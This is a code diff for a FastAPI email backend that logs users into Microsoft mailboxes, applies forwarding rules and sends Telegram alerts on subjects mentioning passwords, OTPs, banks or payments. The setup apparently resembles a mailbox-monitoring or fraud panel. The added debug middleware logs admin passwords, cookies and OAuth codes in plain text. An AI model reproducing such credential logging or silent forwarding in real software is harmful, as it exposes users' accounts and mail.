@@ -1,6 +1,9 @@
 from fastapi import FastAPI, Request, WebSocket
 from fastapi.responses import RedirectResponse, JSONResponse
-from fastapi.middleware.cors import CORSMiddleware  # Import CORSMiddleware
+from fastapi.middleware.cors import CORSMiddleware
+import logging
+import asyncio
+
 from auth import generate_login_link, exchange_code_for_token
 from graph import (
     fetch_emails,
@@ -19,25 +22,46 @@ from db import init_db, SessionLocal
 from models import TenantToken, Rule
 from rule_engine import apply_rules
 from alerts import send_telegram_alert
-import asyncio
 
 app = FastAPI()
 
 # =========================
-# CORS CONFIGURATION (ENABLE FRONTEND ON RENDER)
+# LOGGING CONFIG
+# =========================
+logging.basicConfig(level=logging.DEBUG)
+
+# =========================
+# CORS (VERY IMPORTANT)
 # =========================
 origins = [
-    "http://localhost:3000",  # Local development (optional)
-    "https://frontend-xg84.onrender.com",  # Replace with your actual Render frontend URL
+    "http://localhost:3000",
+    "https://frontend-xg84.onrender.com",  # 🔁 replace if needed
 ]
 
 app.add_middleware(
     CORSMiddleware,
-    allow_origins=origins,  # Allow frontend URLs
+    allow_origins=origins,
     allow_credentials=True,
     allow_methods=["*"],
     allow_headers=["*"],
 )
+
+# =========================
+# DEBUG MIDDLEWARE 🔥
+# =========================
+@app.middleware("http")
+async def log_requests(request: Request, call_next):
+    logging.debug(f"\n--- REQUEST START ---")
+    logging.debug(f"{request.method} {request.url}")
+    logging.debug(f"Headers: {request.headers}")
+    logging.debug(f"Cookies: {request.cookies}")
+
+    response = await call_next(request)
+
+    logging.debug(f"Response Status: {response.status_code}")
+    logging.debug(f"--- REQUEST END ---\n")
+
+    return response
 
 # =========================
 # WEBSOCKET (REAL-TIME ALERTS)
@@ -55,14 +79,12 @@ async def websocket_alerts(ws: WebSocket):
     except:
         connected_clients.remove(ws)
 
-
 async def broadcast_alert(message: str):
     for ws in connected_clients:
         try:
             await ws.send_text(message)
         except:
             pass
-
 
 # =========================
 # STARTUP
@@ -71,31 +93,14 @@ async def broadcast_alert(message: str):
 def startup():
     init_db()
 
-
 # =========================
 # ADMIN AUTH
 # =========================
 @app.post("/admin/login")
 async def admin_login(request: Request):
     body = await request.json()
+    logging.debug(f"LOGIN BODY: {body}")
     return login_admin(body.get("username"), body.get("password"))
-
-
-@app.post("/admin/reset-password")
-async def reset_admin_password(request: Request):
-    require_admin(request)
-
-    body = await request.json()
-    new_password = body.get("new_password")
-
-    if not new_password:
-        return {"error": "New password required"}
-
-    import admin_auth
-    admin_auth.ADMIN_PASSWORD = new_password
-
-    return {"message": "Password updated successfully"}
-
 
 # =========================
 # MICROSOFT LOGIN
@@ -103,7 +108,6 @@ async def reset_admin_password(request: Request):
 @app.get("/login")
 def login(user_id: str = None):
     return RedirectResponse(generate_login_link(user_id or "default-user"))
-
 
 @app.get("/generate-login-url")
 def generate_login_url(user_id: str = None):
@@ -115,13 +119,14 @@ def generate_login_url(user_id: str = None):
 
     return {"login_url": login_url, "session_id": session_id}
 
-
 @app.get("/auth/callback")
 def auth_callback(request: Request):
     init_db()
 
     code = request.query_params.get("code")
     state = request.query_params.get("state")
+
+    logging.debug(f"AUTH CALLBACK: code={code}, state={state}")
 
     if not code:
         return {"error": "No code received"}
@@ -139,25 +144,27 @@ def auth_callback(request: Request):
             key="session_id",
             value=session_id,
             httponly=True,
-            secure=True,  # Ensure cookies are secure
-            samesite="none",  # Needed for cross-origin requests
+            secure=True,
+            samesite="none",  # 🔥 CRITICAL FOR RENDER
             path="/",
         )
+
+        logging.debug(f"SESSION COOKIE SET: {session_id}")
 
         return response
 
     except Exception as e:
+        logging.error(f"AUTH ERROR: {e}")
         return {"error": str(e)}
 
-
 # =========================
-# SESSION / LOGOUT
+# SESSION
 # =========================
 @app.get("/session")
 def check_session(request: Request):
     sid = request.cookies.get("session_id")
+    logging.debug(f"SESSION CHECK: {sid}")
     return {"active": bool(sid), "session_id": sid}
-
 
 @app.get("/logout")
 def logout():
@@ -165,20 +172,21 @@ def logout():
     res.delete_cookie("session_id", path="/")
     return res
 
-
 # =========================
-# EMAILS (WITH RULE ENGINE + ALERTS)
+# EMAILS (RULES + ALERTS)
 # =========================
 @app.get("/emails")
 def get_emails(request: Request, user_id: str = None):
     require_admin(request)
 
     session_id = request.cookies.get("session_id")
+    logging.debug(f"SESSION IN EMAILS: {session_id}")
+
     user_id = user_id or "default-user"
 
     emails = fetch_emails(user_id, session_id)
 
-    ALERT_KEYWORDS = ["password", "bank", "otp", "urgent", "invoice", "payment", "wire"]
+    ALERT_KEYWORDS = ["password", "bank", "otp", "urgent", "invoice", "payment"]
 
     for e in emails:
         email_data = {
@@ -188,48 +196,18 @@ def get_emails(request: Request, user_id: str = None):
             "from": e.get("from")
         }
 
-        # APPLY RULES
+        # RULE ENGINE
         apply_rules(user_id, session_id, email_data)
 
         # ALERTS
         for word in ALERT_KEYWORDS:
-            if word.lower() in (email_data["subject"] or "").lower():
-                msg = f"🚨 ALERT: {word} detected → {email_data['subject']}"
+            if word in (email_data["subject"] or "").lower():
+                msg = f"🚨 {word.upper()} detected → {email_data['subject']}"
 
                 send_telegram_alert(msg)
                 asyncio.create_task(broadcast_alert(msg))
 
     return {"emails": emails}
-
-
-@app.get("/emails/{folder_id}")
-def get_emails_by_folder(folder_id: str, request: Request, user_id: str = None):
-    require_admin(request)
-
-    return {
-        "emails": fetch_emails(
-            user_id or "default-user",
-            request.cookies.get("session_id"),
-            folder_id
-        )
-    }
-
-
-# =========================
-# THREADS
-# =========================
-@app.get("/conversation/{conversation_id}")
-def conversation(conversation_id: str, request: Request, user_id: str = None):
-    require_admin(request)
-
-    return {
-        "messages": get_conversation(
-            user_id or "default-user",
-            request.cookies.get("session_id"),
-            conversation_id
-        )
-    }
-
 
 # =========================
 # FOLDERS
@@ -238,25 +216,26 @@ def conversation(conversation_id: str, request: Request, user_id: str = None):
 def get_folders(request: Request, user_id: str = None):
     require_admin(request)
 
+    session_id = request.cookies.get("session_id")
+    logging.debug(f"SESSION IN FOLDERS: {session_id}")
+
     return {
         "folders": get_mail_folders(
             user_id or "default-user",
-            request.cookies.get("session_id")
+            session_id
         )
     }
 
-
 # =========================
-# EMAIL DETAIL (RULE TRIGGER HERE TOO)
+# EMAIL DETAIL
 # =========================
 @app.get("/email/{message_id}")
 def email_detail(message_id: str, request: Request, user_id: str = None):
     require_admin(request)
 
-    user_id = user_id or "default-user"
     session_id = request.cookies.get("session_id")
 
-    data = get_email_detail(user_id, session_id, message_id)
+    data = get_email_detail(user_id or "default-user", session_id, message_id)
 
     apply_rules(user_id, session_id, {
         "id": message_id,
@@ -267,75 +246,45 @@ def email_detail(message_id: str, request: Request, user_id: str = None):
 
     return data
 
-
 # =========================
-# SEND / REPLY / FORWARD
+# RULES
 # =========================
-@app.post("/send")
-async def send_new_email(request: Request, user_id: str = None):
+@app.post("/rules")
+async def add_rule(request: Request):
     require_admin(request)
+
     body = await request.json()
+    logging.debug(f"RULE CREATE: {body}")
 
-    return send_email(
-        user_id or "default-user",
-        request.cookies.get("session_id"),
-        body.get("to"),
-        body.get("subject"),
-        body.get("body"),
-        body.get("attachments")
+    db = SessionLocal()
+
+    rule = Rule(
+        condition=body.get("condition"),
+        action=body.get("action"),
+        target_folder=body.get("target_folder"),
+        forward_to=body.get("forward_to")
     )
 
+    db.add(rule)
+    db.commit()
+    db.close()
 
-@app.post("/email/{message_id}/reply")
-async def reply_email(message_id: str, request: Request, user_id: str = None):
-    require_admin(request)
-    body = await request.json()
+    return {"message": "Rule created"}
 
-    return reply_to_email(
-        user_id or "default-user",
-        request.cookies.get("session_id"),
-        message_id,
-        body.get("message"),
-        body.get("attachments")
-    )
-
-
-@app.post("/email/{message_id}/forward")
-async def forward(message_id: str, request: Request, user_id: str = None):
-    require_admin(request)
-    body = await request.json()
-
-    return forward_email(
-        user_id or "default-user",
-        request.cookies.get("session_id"),
-        message_id,
-        body.get("to")
-    )
-
-
-# =========================
-# DELETE / READ
-# =========================
-@app.delete("/email/{message_id}")
-def delete(message_id: str, request: Request, user_id: str = None):
+@app.get("/rules")
+def get_rules(request: Request):
     require_admin(request)
 
-    return delete_email(
-        user_id or "default-user",
-        request.cookies.get("session_id"),
-        message_id
-    )
+    db = SessionLocal()
+    rules = db.query(Rule).all()
 
+    result = [{
+        "id": r.id,
+        "condition": r.condition,
+        "action": r.action.value,
+        "target_folder": r.target_folder,
+        "forward_to": r.forward_to
+    } for r in rules]
 
-@app.post("/email/{message_id}/read")
-async def mark_read(message_id: str, request: Request, user_id: str = None):
-    require_admin(request)
-    body = await request.json()
-
-    return mark_as_read(
-        user_id or "default-user",
-        request.cookies.get("session_id"),
-        message_id,
-        body.get("isRead", True)
-    )
-
+    db.close()
+    return {"rules": result}
